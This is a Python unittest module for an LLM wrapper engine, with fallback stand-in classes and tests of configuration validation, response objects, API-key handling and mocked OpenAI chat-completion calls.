import unittest
from unittest.mock import Mock, patch, MagicMock, call, AsyncMock
import asyncio
import json
from typing import Dict, Any, List, Optional
import os
import sys
import tempfile
import pytest

# Add the parent directory to sys.path to import the module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    from llm_engine import LLMEngine, LLMConfig, LLMResponse, LLMError
except ImportError:
    # Create mock classes if the actual implementation doesn't exist yet
    class LLMError(Exception):
        """Base exception for LLM-related errors."""
        pass

    class LLMConfig:
        """Configuration class for LLM Engine."""
        def __init__(self, model: str = "gpt-3.5-turbo", temperature: float = 0.7, 
                     max_tokens: int = 1000, api_key: str = None, timeout: int = 30):
            if temperature < 0 or temperature > 2:
                raise ValueError("Temperature must be between 0 and 2")
            if max_tokens <= 0:
                raise ValueError("Max tokens must be positive")
            
            self.model = model
            self.temperature = temperature
            self.max_tokens = max_tokens
            self.api_key = api_key
            self.timeout = timeout
        
        def to_dict(self) -> Dict[str, Any]:
            return {
                "model": self.model,
                "temperature": self.temperature,
                "max_tokens": self.max_tokens,
                "api_key": self.api_key,
                "timeout": self.timeout
            }
        
        @classmethod
        def from_dict(cls, data: Dict[str, Any]) -> 'LLMConfig':
            return cls(**data)
        
        def __eq__(self, other):
            if not isinstance(other, LLMConfig):
                return False
            return (self.model == other.model and 
                    self.temperature == other.temperature and 
                    self.max_tokens == other.max_tokens and
                    self.api_key == other.api_key)
        
        def __str__(self):
            return f"LLMConfig(model={self.model}, temperature={self.temperature})"
    
    class LLMResponse:
        """Response class for LLM generation results."""
        def __init__(self, content: str, usage: Dict[str, int] = None, 
                     model: str = None, finish_reason: str = "stop"):
            self.content = content
            self.usage = usage or {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0}
            self.model = model
            self.finish_reason = finish_reason
        
        def __eq__(self, other):
            if not isinstance(other, LLMResponse):
                return False
            return (self.content == other.content and 
                    self.usage == other.usage and
                    self.model == other.model and
                    self.finish_reason == other.finish_reason)
        
        def to_dict(self) -> Dict[str, Any]:
            return {
                "content": self.content,
                "usage": self.usage,
                "model": self.model,
                "finish_reason": self.finish_reason
            }
    
    class LLMEngine:
        """Main LLM Engine class for handling language model interactions."""
        def __init__(self, config: LLMConfig):
            if not isinstance(config, LLMConfig):
                raise TypeError("Config must be an instance of LLMConfig")
            self.config = config
            self._client = None
            self._initialize_client()
        
        def _initialize_client(self):
            """Initialize the OpenAI client."""
            if self.config.api_key:
                import openai
                self._client = openai.AsyncOpenAI(api_key=self.config.api_key)
        
        async def generate(self, prompt: str, system_prompt: str = None, **kwargs) -> LLMResponse:
            """Generate text using the LLM."""
            if not prompt or not prompt.strip():
                raise ValueError("Prompt cannot be empty")
            
            if len(prompt) > 50000:  # Arbitrary large limit
                raise ValueError("Prompt too long")
            
            if not self._client:
                raise LLMError("Client not initialized. Check API key.")
            
            messages = []
            if system_prompt:
                messages.append({"role": "system", "content": system_prompt})
            messages.append({"role": "user", "content": prompt})
            
            try:
                response = await self._client.chat.completions.create(
                    model=self.config.model,
                    messages=messages,
                    temperature=self.config.temperature,
                    max_tokens=self.config.max_tokens,
                    **kwargs
                )
                
                return LLMResponse(
                    content=response.choices[0].message.content,
                    usage={
                        "prompt_tokens": response.usage.prompt_tokens,
                        "completion_tokens": response.usage.completion_tokens,
                        "total_tokens": response.usage.total_tokens
                    },
                    model=response.model,
                    finish_reason=response.choices[0].finish_reason
                )
            except Exception as e:
                raise LLMError(f"Generation failed: {str(e)}")
        
        def set_api_key(self, api_key: str):
            """Set or update the API key."""
            if not api_key or not isinstance(api_key, str):
                raise ValueError("API key must be a non-empty string")
            
            self.config.api_key = api_key
            self._initialize_client()
        
        def validate_config(self) -> bool:
            """Validate the current configuration."""
            if not self.config.model or not self.config.model.strip():
                return False
            if self.config.api_key is None:
                return False
            if self.config.temperature < 0 or self.config.temperature > 2:
                return False
            if self.config.max_tokens <= 0:
                return False
            return True
        
        def __str__(self):
            return f"LLMEngine(model={self.config.model})"


class TestLLMConfig(unittest.TestCase):
    """Test cases for LLMConfig class."""

    def test_config_initialization_with_defaults(self):
        """Test LLMConfig initialization with default parameters."""
        config = LLMConfig()
        
        self.assertEqual(config.model, "gpt-3.5-turbo")
        self.assertEqual(config.temperature, 0.7)
        self.assertEqual(config.max_tokens, 1000)
        self.assertIsNone(config.api_key)
        self.assertEqual(config.timeout, 30)

    def test_config_initialization_with_custom_values(self):
        """Test LLMConfig initialization with custom parameters."""
        config = LLMConfig(
            model="gpt-4",
            temperature=0.5,
            max_tokens=2000,
            api_key="test_key_123",
            timeout=60
        )
        
        self.assertEqual(config.model, "gpt-4")
        self.assertEqual(config.temperature, 0.5)
        self.assertEqual(config.max_tokens, 2000)
        self.assertEqual(config.api_key, "test_key_123")
        self.assertEqual(config.timeout, 60)

    def test_config_invalid_temperature_negative(self):
        """Test LLMConfig with negative temperature."""
        with self.assertRaises(ValueError) as context:
            LLMConfig(temperature=-0.1)
        self.assertIn("Temperature must be between 0 and 2", str(context.exception))

    def test_config_invalid_temperature_too_high(self):
        """Test LLMConfig with temperature above 2."""
        with self.assertRaises(ValueError) as context:
            LLMConfig(temperature=2.1)
        self.assertIn("Temperature must be between 0 and 2", str(context.exception))

    def test_config_invalid_max_tokens_zero(self):
        """Test LLMConfig with zero max_tokens."""
        with self.assertRaises(ValueError) as context:
            LLMConfig(max_tokens=0)
        self.assertIn("Max tokens must be positive", str(context.exception))

    def test_config_invalid_max_tokens_negative(self):
        """Test LLMConfig with negative max_tokens."""
        with self.assertRaises(ValueError) as context:
            LLMConfig(max_tokens=-100)
        self.assertIn("Max tokens must be positive", str(context.exception))

    def test_config_valid_temperature_boundaries(self):
        """Test LLMConfig with valid temperature boundary values."""
        config_min = LLMConfig(temperature=0.0)
        config_max = LLMConfig(temperature=2.0)
        
        self.assertEqual(config_min.temperature, 0.0)
        self.assertEqual(config_max.temperature, 2.0)

    def test_config_to_dict(self):
        """Test LLMConfig serialization to dictionary."""
        config = LLMConfig(
            model="gpt-4",
            temperature=0.8,
            max_tokens=1500,
            api_key="test_key",
            timeout=45
        )
        
        result = config.to_dict()
        expected = {
            "model": "gpt-4",
            "temperature": 0.8,
            "max_tokens": 1500,
            "api_key": "test_key",
            "timeout": 45
        }
        
        self.assertEqual(result, expected)

    def test_config_from_dict(self):
        """Test LLMConfig deserialization from dictionary."""
        data = {
            "model": "gpt-3.5-turbo-16k",
            "temperature": 0.3,
            "max_tokens": 4000,
            "api_key": "from_dict_key",
            "timeout": 120
        }
        
        config = LLMConfig.from_dict(data)
        
        self.assertEqual(config.model, "gpt-3.5-turbo-16k")
        self.assertEqual(config.temperature, 0.3)
        self.assertEqual(config.max_tokens, 4000)
        self.assertEqual(config.api_key, "from_dict_key")
        self.assertEqual(config.timeout, 120)

    def test_config_equality(self):
        """Test LLMConfig equality comparison."""
        config1 = LLMConfig(model="gpt-3.5-turbo", temperature=0.7, api_key="key1")
        config2 = LLMConfig(model="gpt-3.5-turbo", temperature=0.7, api_key="key1")
        config3 = LLMConfig(model="gpt-4", temperature=0.7, api_key="key1")
        config4 = LLMConfig(model="gpt-3.5-turbo", temperature=0.8, api_key="key1")
        
        self.assertEqual(config1, config2)
        self.assertNotEqual(config1, config3)
        self.assertNotEqual(config1, config4)
        self.assertNotEqual(config1, "not_a_config")

    def test_config_string_representation(self):
        """Test LLMConfig string representation."""
        config = LLMConfig(model="gpt-4", temperature=0.9)
        config_str = str(config)
        
        self.assertIn("LLMConfig", config_str)
        self.assertIn("gpt-4", config_str)
        self.assertIn("0.9", config_str)


class TestLLMResponse(unittest.TestCase):
    """Test cases for LLMResponse class."""

    def test_response_initialization_with_defaults(self):
        """Test LLMResponse initialization with default parameters."""
        response = LLMResponse("Test content")
        
        self.assertEqual(response.content, "Test content")
        self.assertEqual(response.usage["prompt_tokens"], 0)
        self.assertEqual(response.usage["completion_tokens"], 0)
        self.assertEqual(response.usage["total_tokens"], 0)
        self.assertIsNone(response.model)
        self.assertEqual(response.finish_reason, "stop")

    def test_response_initialization_with_custom_values(self):
        """Test LLMResponse initialization with custom parameters."""
        usage = {"prompt_tokens": 15, "completion_tokens": 25, "total_tokens": 40}
        response = LLMResponse(
            content="Custom content",
            usage=usage,
            model="gpt-4",
            finish_reason="length"
        )
        
        self.assertEqual(response.content, "Custom content")
        self.assertEqual(response.usage, usage)
        self.assertEqual(response.model, "gpt-4")
        self.assertEqual(response.finish_reason, "length")

    def test_response_equality(self):
        """Test LLMResponse equality comparison."""
        usage = {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
        
        response1 = LLMResponse("content", usage, "gpt-3.5-turbo", "stop")
        response2 = LLMResponse("content", usage, "gpt-3.5-turbo", "stop")
        response3 = LLMResponse("different", usage, "gpt-3.5-turbo", "stop")
        
        self.assertEqual(response1, response2)
        self.assertNotEqual(response1, response3)
        self.assertNotEqual(response1, "not_a_response")

    def test_response_to_dict(self):
        """Test LLMResponse serialization to dictionary."""
        usage = {"prompt_tokens": 12, "completion_tokens": 28, "total_tokens": 40}
        response = LLMResponse(
            content="Serialized content",
            usage=usage,
            model="gpt-4-turbo",
            finish_reason="stop"
        )
        
        result = response.to_dict()
        expected = {
            "content": "Serialized content",
            "usage": usage,
            "model": "gpt-4-turbo",
            "finish_reason": "stop"
        }
        
        self.assertEqual(result, expected)

    def test_response_empty_content(self):
        """Test LLMResponse with empty content."""
        response = LLMResponse("")
        
        self.assertEqual(response.content, "")
        self.assertIsInstance(response.usage, dict)

    def test_response_unicode_content(self):
        """Test LLMResponse with unicode characters."""
        unicode_content = "Hello 世界! 🌍 émojis and açcénts"
        response = LLMResponse(unicode_content)
        
        self.assertEqual(response.content, unicode_content)


class TestLLMEngine(unittest.TestCase):
    """Test cases for LLMEngine class."""

    def setUp(self):
        """Set up test fixtures before each test method."""
        self.valid_config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key="test_api_key_123"
        )
        self.engine = LLMEngine(self.valid_config)

    def tearDown(self):
        """Clean up after each test method."""
        # Clean up any temporary resources
        pass

    def test_engine_initialization_valid_config(self):
        """Test LLMEngine initialization with valid configuration."""
        engine = LLMEngine(self.valid_config)
        
        self.assertEqual(engine.config, self.valid_config)
        self.assertIsNotNone(engine)

    def test_engine_initialization_invalid_config_none(self):
        """Test LLMEngine initialization with None config."""
        with self.assertRaises(TypeError) as context:
            LLMEngine(None)
        self.assertIn("Config must be an instance of LLMConfig", str(context.exception))

    def test_engine_initialization_invalid_config_wrong_type(self):
        """Test LLMEngine initialization with wrong config type."""
        with self.assertRaises(TypeError) as context:
            LLMEngine("not_a_config")
        self.assertIn("Config must be an instance of LLMConfig", str(context.exception))

    def test_engine_initialization_invalid_config_dict(self):
        """Test LLMEngine initialization with dictionary instead of config."""
        config_dict = {"model": "gpt-3.5-turbo", "temperature": 0.7}
        with self.assertRaises(TypeError) as context:
            LLMEngine(config_dict)
        self.assertIn("Config must be an instance of LLMConfig", str(context.exception))

    @patch('openai.AsyncOpenAI')
    async def test_generate_simple_prompt_success(self, mock_openai):
        """Test successful generation with simple prompt."""
        # Setup mock
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Generated response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        # Reinitialize engine to use mocked client
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        result = await engine.generate("Test prompt")
        
        self.assertIsInstance(result, LLMResponse)
        self.assertEqual(result.content, "Generated response")
        self.assertEqual(result.usage["prompt_tokens"], 10)
        self.assertEqual(result.usage["completion_tokens"], 20)
        self.assertEqual(result.usage["total_tokens"], 30)
        self.assertEqual(result.model, "gpt-3.5-turbo")
        self.assertEqual(result.finish_reason, "stop")

    @patch('openai.AsyncOpenAI')
    async def test_generate_with_system_prompt_success(self, mock_openai):
        """Test successful generation with system prompt."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "System-guided response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 15
        mock_response.usage.completion_tokens = 25
        mock_response.usage.total_tokens = 40
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        result = await engine.generate(
            "User prompt", 
            system_prompt="You are a helpful assistant"
        )
        
        self.assertIsInstance(result, LLMResponse)
        self.assertEqual(result.content, "System-guided response")
        
        # Verify system prompt was included in the call
        call_args = mock_client.chat.completions.create.call_args
        messages = call_args[1]['messages']
        self.assertEqual(len(messages), 2)
        self.assertEqual(messages[0]['role'], 'system')
        self.assertEqual(messages[0]['content'], 'You are a helpful assistant')
        self.assertEqual(messages[1]['role'], 'user')
        self.assertEqual(messages[1]['content'], 'User prompt')

    async def test_generate_empty_prompt(self):
        """Test generation with empty prompt."""
        with self.assertRaises(ValueError) as context:
            await self.engine.generate("")
        self.assertIn("Prompt cannot be empty", str(context.exception))

    async def test_generate_none_prompt(self):
        """Test generation with None prompt."""
        with self.assertRaises(ValueError) as context:
            await self.engine.generate(None)
        self.assertIn("Prompt cannot be empty", str(context.exception))

    async def test_generate_whitespace_only_prompt(self):
        """Test generation with whitespace-only prompt."""
        with self.assertRaises(ValueError) as context:
            await self.engine.generate("   \n\t   ")
        self.assertIn("Prompt cannot be empty", str(context.exception))

    async def test_generate_very_long_prompt(self):
        """Test generation with extremely long prompt."""
        long_prompt = "x" * 50001  # Exceeds the limit
        
        with self.assertRaises(ValueError) as context:
            await self.engine.generate(long_prompt)
        self.assertIn("Prompt too long", str(context.exception))

    async def test_generate_no_client_initialized(self):
        """Test generation when client is not initialized."""
        config = LLMConfig(api_key=None)  # No API key
        engine = LLMEngine(config)
        
        with self.assertRaises(LLMError) as context:
            await engine.generate("Test prompt")
        self.assertIn("Client not initialized", str(context.exception))

    @patch('openai.AsyncOpenAI')
    async def test_generate_api_error_handling(self, mock_openai):
        """Test handling of generic API errors during generation."""
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = Exception("Generic API Error")
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        with self.assertRaises(LLMError) as context:
            await self.engine.generate("Test prompt")
        self.assertIn("Generation failed", str(context.exception))

    @patch('openai.AsyncOpenAI')
    async def test_generate_with_custom_kwargs(self, mock_openai):
        """Test generation with additional keyword arguments."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Custom response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        await engine.generate("Test prompt", presence_penalty=0.5, frequency_penalty=0.3)
        
        # Verify custom kwargs were passed
        call_args = mock_client.chat.completions.create.call_args
        self.assertEqual(call_args[1]['presence_penalty'], 0.5)
        self.assertEqual(call_args[1]['frequency_penalty'], 0.3)

    def test_set_api_key_valid(self):
        """Test setting a valid API key."""
        new_key = "new_api_key_456"
        self.engine.set_api_key(new_key)
        
        self.assertEqual(self.engine.config.api_key, new_key)

    def test_set_api_key_empty_string(self):
        """Test setting empty string as API key."""
        with self.assertRaises(ValueError) as context:
            self.engine.set_api_key("")
        self.assertIn("API key must be a non-empty string", str(context.exception))

    def test_set_api_key_none(self):
        """Test setting None as API key."""
        with self.assertRaises(ValueError) as context:
            self.engine.set_api_key(None)
        self.assertIn("API key must be a non-empty string", str(context.exception))

    def test_set_api_key_wrong_type(self):
        """Test setting non-string as API key."""
        with self.assertRaises(ValueError) as context:
            self.engine.set_api_key(123)
        self.assertIn("API key must be a non-empty string", str(context.exception))

    def test_validate_config_valid(self):
        """Test configuration validation with valid config."""
        result = self.engine.validate_config()
        self.assertTrue(result)

    def test_validate_config_missing_api_key(self):
        """Test configuration validation with missing API key."""
        config = LLMConfig(api_key=None)
        engine = LLMEngine(config)
        
        result = engine.validate_config()
        self.assertFalse(result)

    def test_validate_config_empty_model(self):
        """Test configuration validation with empty model."""
        config = LLMConfig(model="", api_key="test_key")
        engine = LLMEngine(config)
        
        result = engine.validate_config()
        self.assertFalse(result)

    def test_validate_config_whitespace_model(self):
        """Test configuration validation with whitespace-only model."""
        config = LLMConfig(model="   ", api_key="test_key")
        engine = LLMEngine(config)
        
        result = engine.validate_config()
        self.assertFalse(result)

    def test_validate_config_invalid_temperature(self):
        """Test configuration validation with invalid temperature."""
        # This should not happen due to LLMConfig validation, but test anyway
        config = LLMConfig(api_key="test_key")
        config.temperature = -1  # Manually set invalid value
        engine = LLMEngine(config)
        
        result = engine.validate_config()
        self.assertFalse(result)

    def test_validate_config_invalid_max_tokens(self):
        """Test configuration validation with invalid max_tokens."""
        config = LLMConfig(api_key="test_key")
        config.max_tokens = 0  # Manually set invalid value
        engine = LLMEngine(config)
        
        result = engine.validate_config()
        self.assertFalse(result)

    def test_engine_string_representation(self):
        """Test string representation of LLMEngine."""
        engine_str = str(self.engine)
        
        self.assertIn("LLMEngine", engine_str)
        self.assertIn("gpt-3.5-turbo", engine_str)

    @patch('openai.AsyncOpenAI')
    async def test_generate_special_characters(self, mock_openai):
        """Test generation with special characters in prompt."""
        special_prompt = "Test with émojis 🎉 and unicode ñáéíóú"
        
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Special char response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 15
        mock_response.usage.completion_tokens = 25
        mock_response.usage.total_tokens = 40
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        result = await engine.generate(special_prompt)
        
        self.assertIsInstance(result, LLMResponse)
        self.assertEqual(result.content, "Special char response")
        
        # Verify special characters were passed correctly
        call_args = mock_client.chat.completions.create.call_args
        messages = call_args[1]['messages']
        self.assertEqual(messages[0]['content'], special_prompt)

    @patch('openai.AsyncOpenAI')
    async def test_generate_json_response(self, mock_openai):
        """Test generation that returns JSON response."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = '{"key": "value", "number": 42}'
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        result = await engine.generate("Return JSON response")
        
        # Test that the JSON content can be parsed
        json_data = json.loads(result.content)
        self.assertEqual(json_data["key"], "value")
        self.assertEqual(json_data["number"], 42)

    @patch('openai.AsyncOpenAI')
    async def test_concurrent_generations(self, mock_openai):
        """Test handling multiple concurrent generation requests."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Concurrent response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        # Create multiple concurrent tasks
        tasks = [
            engine.generate(f"Prompt {i}") 
            for i in range(5)
        ]
        
        results = await asyncio.gather(*tasks)
        
        self.assertEqual(len(results), 5)
        for result in results:
            self.assertIsInstance(result, LLMResponse)
            self.assertEqual(result.content, "Concurrent response")
        
        # Verify all calls were made
        self.assertEqual(mock_client.chat.completions.create.call_count, 5)

    @patch('openai.AsyncOpenAI')
    async def test_generate_different_models(self, mock_openai):
        """Test generation with different model types."""
        models = ["gpt-3.5-turbo", "gpt-4", "gpt-4-turbo"]
        
        for model in models:
            with self.subTest(model=model):
                config = LLMConfig(model=model, api_key="test_key")
                engine = LLMEngine(config)
                
                mock_client = AsyncMock()
                mock_response = Mock()
                mock_response.choices = [Mock()]
                mock_response.choices[0].message.content = f"Response from {model}"
                mock_response.choices[0].finish_reason = "stop"
                mock_response.usage.prompt_tokens = 10
                mock_response.usage.completion_tokens = 20
                mock_response.usage.total_tokens = 30
                mock_response.model = model
                
                mock_client.chat.completions.create.return_value = mock_response
                mock_openai.return_value = mock_client
                engine._client = mock_client
                
                result = await engine.generate("Test prompt")
                
                self.assertEqual(result.model, model)
                self.assertEqual(result.content, f"Response from {model}")
                
                # Verify correct model was used in API call
                call_args = mock_client.chat.completions.create.call_args
                self.assertEqual(call_args[1]['model'], model)

    @patch('openai.AsyncOpenAI')
    async def test_generate_custom_parameters(self, mock_openai):
        """Test generation with custom temperature and max_tokens."""
        custom_config = LLMConfig(
            model="gpt-4",
            temperature=0.9,
            max_tokens=500,
            api_key="test_key"
        )
        engine = LLMEngine(custom_config)
        
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Custom parameter response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-4"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        engine._client = mock_client
        
        await engine.generate("Test prompt")
        
        # Verify custom parameters were used
        call_args = mock_client.chat.completions.create.call_args
        self.assertEqual(call_args[1]['model'], "gpt-4")
        self.assertEqual(call_args[1]['temperature'], 0.9)
        self.assertEqual(call_args[1]['max_tokens'], 500)

    @patch('openai.AsyncOpenAI')
    async def test_generate_timeout_handling(self, mock_openai):
        """Test handling of timeout errors during generation."""
        mock_client = AsyncMock()
        mock_client.chat.completions.create.side_effect = asyncio.TimeoutError()
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.valid_config)
        engine._client = mock_client
        
        with self.assertRaises(LLMError) as context:
            await engine.generate("Test prompt")
        self.assertIn("Generation failed", str(context.exception))


class TestLLMEngineIntegration(unittest.TestCase):
    """Integration tests for LLM Engine with more realistic scenarios."""
    
    def setUp(self):
        """Set up integration test fixtures."""
        self.config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key=os.getenv("OPENAI_API_KEY", "test_key")
        )
        self.engine = LLMEngine(self.config)

    @unittest.skipUnless(os.getenv("OPENAI_API_KEY"), "API key required for integration tests")
    async def test_real_api_call(self):
        """Test with real API call (requires API key)."""
        result = await self.engine.generate("Say hello in a friendly way")
        
        self.assertIsInstance(result, LLMResponse)
        self.assertIsNotNone(result.content)
        self.assertTrue(len(result.content) > 0)
        self.assertGreater(result.usage["completion_tokens"], 0)

    def test_comprehensive_config_validation(self):
        """Comprehensive configuration validation test."""
        valid_configs = [
            LLMConfig(model="gpt-3.5-turbo", temperature=0.0, max_tokens=1, api_key="key"),
            LLMConfig(model="gpt-4", temperature=1.0, max_tokens=4096, api_key="key"),
            LLMConfig(model="gpt-3.5-turbo-16k", temperature=0.5, max_tokens=2000, api_key="key")
        ]
        
        for config in valid_configs:
            with self.subTest(config=config):
                engine = LLMEngine(config)
                self.assertTrue(engine.validate_config())

    def test_config_roundtrip_serialization(self):
        """Test config serialization and deserialization roundtrip."""
        original_config = LLMConfig(
            model="gpt-4-turbo",
            temperature=0.3,
            max_tokens=3000,
            api_key="roundtrip_key",
            timeout=90
        )
        
        # Serialize to dict and back
        config_dict = original_config.to_dict()
        restored_config = LLMConfig.from_dict(config_dict)
        
        self.assertEqual(original_config, restored_config)


# Test runner functions
async def run_async_tests():
    """Helper function to run async tests."""
    suite = unittest.TestSuite()
    
    # Add async test methods
    async_test_methods = [
        'test_generate_simple_prompt_success',
        'test_generate_with_system_prompt_success',
        'test_generate_empty_prompt',
        'test_generate_none_prompt',
        'test_generate_whitespace_only_prompt',
        'test_generate_very_long_prompt',
        'test_generate_no_client_initialized',
        'test_generate_api_error_handling',
        'test_generate_with_custom_kwargs',
        'test_generate_special_characters',
        'test_generate_json_response',
        'test_concurrent_generations',
        'test_generate_different_models',
        'test_generate_custom_parameters',
        'test_generate_timeout_handling'
    ]
    
    test_engine = TestLLMEngine()
    for method_name in async_test_methods:
        if hasattr(test_engine, method_name):
            method = getattr(test_engine, method_name)
            if asyncio.iscoroutinefunction(method):
                try:
                    await method()
                    print(f"✓ {method_name} passed")
                except Exception as e:
                    print(f"✗ {method_name} failed: {e}")


if __name__ == '__main__':
    # Run synchronous tests
    print("Running synchronous tests...")
    unittest.main(verbosity=2, exit=False)
    
    # Run async tests
    print("\nRunning asynchronous tests...")
    asyncio.run(run_async_tests())

class TestLLMConfigAdvanced(unittest.TestCase):
    """Advanced test cases for LLMConfig edge cases and scenarios."""

    def test_config_temperature_float_precision(self):
        """Test LLMConfig with high precision temperature values."""
        config = LLMConfig(temperature=0.123456789)
        self.assertAlmostEqual(config.temperature, 0.123456789, places=8)

    def test_config_temperature_boundary_values(self):
        """Test LLMConfig with exact boundary temperature values."""
        # Test exactly at boundaries
        config_zero = LLMConfig(temperature=0.0)
        config_two = LLMConfig(temperature=2.0)
        
        self.assertEqual(config_zero.temperature, 0.0)
        self.assertEqual(config_two.temperature, 2.0)

    def test_config_large_max_tokens(self):
        """Test LLMConfig with very large max_tokens values."""
        large_tokens = 100000
        config = LLMConfig(max_tokens=large_tokens)
        self.assertEqual(config.max_tokens, large_tokens)

    def test_config_api_key_with_special_characters(self):
        """Test LLMConfig with API key containing special characters."""
        special_key = "sk-1234!@#$%^&*()_+-={}[]|\\:;\"'<>?,./"
        config = LLMConfig(api_key=special_key)
        self.assertEqual(config.api_key, special_key)

    def test_config_model_with_spaces_and_special_chars(self):
        """Test LLMConfig with model names containing spaces and special characters."""
        model_name = "gpt-3.5-turbo-0125"
        config = LLMConfig(model=model_name)
        self.assertEqual(config.model, model_name)

    def test_config_timeout_edge_cases(self):
        """Test LLMConfig with various timeout values."""
        timeouts = [1, 60, 300, 3600]  # 1 second to 1 hour
        for timeout in timeouts:
            with self.subTest(timeout=timeout):
                config = LLMConfig(timeout=timeout)
                self.assertEqual(config.timeout, timeout)

    def test_config_from_dict_missing_optional_fields(self):
        """Test LLMConfig.from_dict with missing optional fields."""
        minimal_data = {"model": "gpt-4"}
        config = LLMConfig.from_dict(minimal_data)
        
        self.assertEqual(config.model, "gpt-4")
        self.assertEqual(config.temperature, 0.7)  # default
        self.assertEqual(config.max_tokens, 1000)  # default

    def test_config_from_dict_with_none_values(self):
        """Test LLMConfig.from_dict with None values."""
        data = {
            "model": "gpt-3.5-turbo",
            "temperature": 0.5,
            "max_tokens": 1500,
            "api_key": None,
            "timeout": 45
        }
        config = LLMConfig.from_dict(data)
        self.assertIsNone(config.api_key)

    def test_config_equality_with_different_types(self):
        """Test LLMConfig equality with various data types."""
        config = LLMConfig()
        
        # Test against different types
        self.assertNotEqual(config, None)
        self.assertNotEqual(config, {})
        self.assertNotEqual(config, [])
        self.assertNotEqual(config, 123)
        self.assertNotEqual(config, "string")

    def test_config_hash_consistency(self):
        """Test that equal configs produce consistent string representations."""
        config1 = LLMConfig(model="gpt-4", temperature=0.8)
        config2 = LLMConfig(model="gpt-4", temperature=0.8)
        
        self.assertEqual(str(config1), str(config2))

    def test_config_extreme_values(self):
        """Test LLMConfig with extreme but valid values."""
        # Test with very small positive temperature
        config_small = LLMConfig(temperature=0.001)
        self.assertEqual(config_small.temperature, 0.001)
        
        # Test with very large max_tokens
        config_large = LLMConfig(max_tokens=1000000)
        self.assertEqual(config_large.max_tokens, 1000000)

    def test_config_serialization_roundtrip_with_unicode(self):
        """Test config serialization/deserialization with unicode characters."""
        config = LLMConfig(
            model="gpt-4-ñáéíóú",
            api_key="key_with_émojis_🔑",
            timeout=90
        )
        
        # Serialize and deserialize
        config_dict = config.to_dict()
        restored_config = LLMConfig.from_dict(config_dict)
        
        self.assertEqual(config.model, restored_config.model)
        self.assertEqual(config.api_key, restored_config.api_key)


class TestLLMResponseAdvanced(unittest.TestCase):
    """Advanced test cases for LLMResponse edge cases and scenarios."""

    def test_response_with_zero_usage(self):
        """Test LLMResponse with zero usage tokens."""
        response = LLMResponse("content", {"prompt_tokens": 0, "completion_tokens": 0, "total_tokens": 0})
        
        self.assertEqual(response.usage["prompt_tokens"], 0)
        self.assertEqual(response.usage["completion_tokens"], 0)
        self.assertEqual(response.usage["total_tokens"], 0)

    def test_response_with_malformed_usage(self):
        """Test LLMResponse with malformed usage data."""
        malformed_usage = {"tokens": 100}  # Missing expected keys
        response = LLMResponse("content", malformed_usage)
        
        self.assertEqual(response.usage, malformed_usage)

    def test_response_with_very_long_content(self):
        """Test LLMResponse with very long content."""
        long_content = "x" * 100000
        response = LLMResponse(long_content)
        
        self.assertEqual(len(response.content), 100000)
        self.assertTrue(response.content.startswith("x"))

    def test_response_with_multiline_content(self):
        """Test LLMResponse with multiline content including various line endings."""
        multiline_content = "Line 1\nLine 2\r\nLine 3\rLine 4"
        response = LLMResponse(multiline_content)
        
        self.assertEqual(response.content, multiline_content)
        self.assertIn("\n", response.content)
